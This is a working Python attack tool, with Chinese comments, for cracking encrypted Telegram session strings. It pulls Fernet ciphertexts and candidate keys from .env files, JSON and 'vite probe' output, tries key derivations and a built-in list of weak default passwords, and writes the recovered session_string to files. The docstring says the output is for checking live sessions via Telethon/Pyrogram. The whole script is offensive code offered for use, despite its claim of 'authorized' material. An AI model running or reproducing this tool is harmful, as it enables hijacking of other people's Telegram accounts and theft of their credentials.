#!/usr/bin/env python3
"""Fernet / Telethon·Pyrogram 会话密文碰撞解密（授权物资）。

输入：gAAAAA... 密文 + 候选 ENCRYPTION_KEY（文件/参数/常见弱钥）。
成功：写出明文 session_string，供 Telethon/Pyrogram 外连验活。
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from collections.abc import Iterable

FERNET_RE = re.compile(r"gAAAAA[A-Za-z0-9_\-]{40,}")
# .env / JSON 里常见钥名
KEY_NAME_RE = re.compile(
    r"(?i)^(?:export\s+)?(ENCRYPTION_KEY|FERNET_KEY|SECRET_KEY|SESSION_KEY|"
    r"APP_KEY|DATA_KEY|CRYPTO_KEY)\s*=\s*(.+)$"
)
# 看起来像 urlsafe-base64 Fernet key（32B → 44 chars 含 =）
FERNET_KEY_SHAPE = re.compile(r"^[A-Za-z0-9_\-]{43}=$")

try:
    from cryptography.fernet import Fernet, InvalidToken
except ImportError:
    print("[!] pip install cryptography", file=sys.stderr)
    sys.exit(1)


def _strip_val(s: str) -> str:
    s = (s or "").strip()
    if (s.startswith('"') and s.endswith('"')) or (s.startswith("'") and s.endswith("'")):
        s = s[1:-1]
    return s.strip()


def _norm_key(raw: str) -> list[bytes]:
    """把各种写法规范化成 Fernet 可吃的 urlsafe-base64 32B key 候选。"""
    s = _strip_val(raw)
    if not s:
        return []
    out: list[bytes] = []

    def _try_fernet(k: bytes) -> None:
        try:
            Fernet(k)
            out.append(k)
        except Exception:
            return

    _try_fernet(s.encode())
    pad = s + "=" * (-len(s) % 4)
    _try_fernet(pad.encode())

    # 标准/URL-safe base64 → 32 bytes → Fernet key
    for decoder in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            raw_b = decoder(pad.encode())
            if len(raw_b) == 32:
                _try_fernet(base64.urlsafe_b64encode(raw_b))
        except Exception:
            pass

    # 原始恰好 32 字符/字节当密钥材料
    if len(s.encode()) == 32:
        _try_fernet(base64.urlsafe_b64encode(s.encode()))

    # 口令派生（sha256 → urlsafe b64）— 自建面板常见
    _try_fernet(base64.urlsafe_b64encode(hashlib.sha256(s.encode()).digest()))

    uniq: list[bytes] = []
    seen: set[bytes] = set()
    for k in out:
        if k not in seen:
            seen.add(k)
            uniq.append(k)
    return uniq


def _parse_keys_file(path: Path) -> list[str]:
    if not path.exists():
        print(f"[!] keys-file 不存在：{path}", file=sys.stderr)
        return []
    pool: list[str] = []
    text = path.read_text(encoding="utf-8", errors="ignore")
    # JSON：{"ENCRYPTION_KEY":"..."} 或 vite probe key_hints
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, str) and re.search(r"(ENCRYPTION|FERNET|SECRET|SESSION).*KEY", k, re.I):
                    pool.append(v)
            hints = data.get("key_hints")
            if isinstance(hints, list):
                for h in hints:
                    if isinstance(h, str) and "=" in h:
                        pool.append(h.split("=", 1)[1])
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, str):
                    pool.append(item)
    except Exception:
        pass

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("{"):
            continue
        m = KEY_NAME_RE.match(line)
        if m:
            pool.append(_strip_val(m.group(2)))
            continue
        # KEY=value 但名字不标准：仍取 value
        if "=" in line and not line.startswith("<"):
            left, right = line.split("=", 1)
            if left.strip() and " " not in left.strip():
                pool.append(_strip_val(right))
        # 整行口令 / Fernet key（短口令也要收，供 sha256 派生）
        cand = _strip_val(line)
        if FERNET_KEY_SHAPE.match(cand) or (4 <= len(cand) <= 256 and "://" not in cand):
            pool.append(cand)
    return pool


def iter_keys(keys: list[str], keys_file: Path | None) -> Iterable[tuple[str, bytes]]:
    pool = list(keys)
    if keys_file:
        pool.extend(_parse_keys_file(keys_file))
    # 极弱默认（仅碰撞用）
    pool += [
        "ENCRYPTION_KEY",
        "changeme",
        "secret",
        "telegram",
        "sticker",
        "admin",
        "password",
        "upsnap",
    ]
    seen_label: set[str] = set()
    seen_key: set[bytes] = set()
    for label in pool:
        if not label or label in seen_label:
            continue
        seen_label.add(label)
        for kb in _norm_key(label):
            if kb in seen_key:
                continue
            seen_key.add(kb)
            yield label, kb


def decrypt_one(token: str, keys: list[str], keys_file: Path | None) -> dict:
    token = _strip_val(token)
    if not FERNET_RE.match(token):
        return {"ok": False, "error": "not-fernet-like", "token_prefix": token[:16], "tried": 0}
    tried = 0
    for label, kb in iter_keys(keys, keys_file):
        tried += 1
        try:
            pt = Fernet(kb).decrypt(token.encode())
            text = pt.decode("utf-8", errors="replace")
            return {
                "ok": True,
                "plaintext": text,
                "key_label": label[:120],
                "key_b64_prefix": kb[:16].decode("ascii", errors="replace"),
                "tried": tried,
            }
        except InvalidToken:
            continue
        except Exception:
            continue
    return {"ok": False, "error": "no-key-matched", "tried": tried}


def extract_tokens(path: Path) -> list[str]:
    raw = path.read_text(encoding="utf-8", errors="ignore")
    found = set(FERNET_RE.findall(raw))
    try:
        data = json.loads(raw)

        def walk(o: object) -> None:
            if isinstance(o, dict):
                for k, v in o.items():
                    if k in ("session_string", "session", "string_session") and isinstance(v, str):
                        if v.startswith("gAAAAA"):
                            found.add(v)
                    else:
                        walk(v)
            elif isinstance(o, list):
                for i in o:
                    walk(i)

        walk(data)
    except Exception:
        pass
    return sorted(found)


def selftest() -> int:
    key = Fernet.generate_key()
    f = Fernet(key)
    plain = "1BVabcdefghijklmnopqrstuvwxyz0123456789session"
    token = f.encrypt(plain.encode()).decode()
    r = decrypt_one(token, [key.decode()], None)
    if not r.get("ok") or r.get("plaintext") != plain:
        print("[!] selftest FAIL", r, file=sys.stderr)
        return 1
    # sha256 派生路径
    pwd = "sticker-test-pass"
    k2 = base64.urlsafe_b64encode(hashlib.sha256(pwd.encode()).digest())
    tok2 = Fernet(k2).encrypt(b"hello-session").decode()
    r2 = decrypt_one(tok2, [pwd], None)
    if not r2.get("ok"):
        print("[!] selftest derived FAIL", r2, file=sys.stderr)
        return 1
    print("[+] selftest OK (direct + sha256-derived)")
    return 0


def main() -> None:
    ap = argparse.ArgumentParser(description="Fernet session 碰撞解密")
    sub = ap.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("decrypt", help="解密单条或批量")
    d.add_argument("--token", default="", help="gAAAAA... 密文")
    d.add_argument("--token-file", type=Path, help="含多条 gAAAAA 的文件/JSON")
    d.add_argument("--key", action="append", default=[], help="候选钥（可重复）")
    d.add_argument("--keys-file", type=Path, help="候选钥/.env/vite probe JSON")
    d.add_argument("--out", type=Path, help="成功明文写入目录")

    e = sub.add_parser("extract", help="从文件抽出 Fernet 密文")
    e.add_argument("path", type=Path)

    sub.add_parser("selftest", help="本地加解密自检")

    args = ap.parse_args()
    if args.cmd == "selftest":
        sys.exit(selftest())
    if args.cmd == "extract":
        toks = extract_tokens(args.path)
        print(json.dumps({"count": len(toks), "tokens": toks}, ensure_ascii=False, indent=2))
        return

    tokens: list[str] = []
    if args.token:
        tokens.append(args.token)
    if args.token_file:
        if not args.token_file.exists():
            print(f"[!] token-file 不存在：{args.token_file}", file=sys.stderr)
            sys.exit(2)
        tokens.extend(extract_tokens(args.token_file))
    tokens = sorted(set(tokens))
    if not tokens:
        print("[!] 无 token", file=sys.stderr)
        sys.exit(2)

    results = []
    for i, t in enumerate(tokens):
        r = decrypt_one(t, args.key, args.keys_file)
        r["token_prefix"] = t[:24]
        results.append(r)
        if r.get("ok"):
            print(f"[+] OK key_label={r['key_label']!r} plaintext_prefix={r['plaintext'][:48]}")
            if args.out:
                args.out.mkdir(parents=True, exist_ok=True)
                stamp = datetime.now(UTC).strftime("%H%M%S")
                fn = args.out / f"session_plain_{stamp}_{i}.txt"
                fn.write_text(r["plaintext"] + "\n", encoding="utf-8")
                meta = args.out / f"session_plain_{stamp}_{i}.meta.json"
                meta.write_text(
                    json.dumps(
                        {
                            "key_label": r["key_label"],
                            "token_prefix": t[:24],
                            "tried": r["tried"],
                        },
                        ensure_ascii=False,
                        indent=2,
                    )
                    + "\n",
                    encoding="utf-8",
                )
                print(f"    wrote {fn}")
        else:
            print(f"[-] fail tried={r.get('tried')} {r.get('error')} {t[:24]}...")

    ok_n = sum(1 for r in results if r.get("ok"))
    print(json.dumps({"ok": ok_n, "total": len(results)}, ensure_ascii=False))
    sys.exit(0 if ok_n else 1)


if __name__ == "__main__":
    main()
